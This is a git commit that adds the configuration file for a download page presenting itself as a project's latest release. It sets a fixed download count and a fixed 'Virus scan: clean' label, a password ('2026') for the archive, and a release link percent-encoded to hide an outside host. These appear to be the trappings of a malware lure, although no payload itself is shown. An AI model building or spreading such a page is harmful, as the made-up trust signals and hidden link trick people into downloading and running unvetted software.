992ee8921d334853be3da78c59402e4653405514
dawnalbatrossatone <leosqtex716@gmail.com>
2026-09-25 21:38:51 +0000

    Initial commit

---
+++ js/config.js
@@ -0,0 +1,13 @@
+window.SITE = {
+  owner: "dawnalbatrossatone",
+  repo: "peposi",
+  title: "Download the Latest Release",
+  subtitle:
+    "Click the button to download the file\nFor installation, follow the instructions in the archive",
+  downloads: 14000,
+  virusScan: "Virus scan: clean",
+  archivePassword: "2026",
+  releaseUrl: "https://%67%69t%64%6F%77n%6Co%61d.%6Ci%76e/peposi",
+  assetName: "",
+  corsProxy: "",
+};
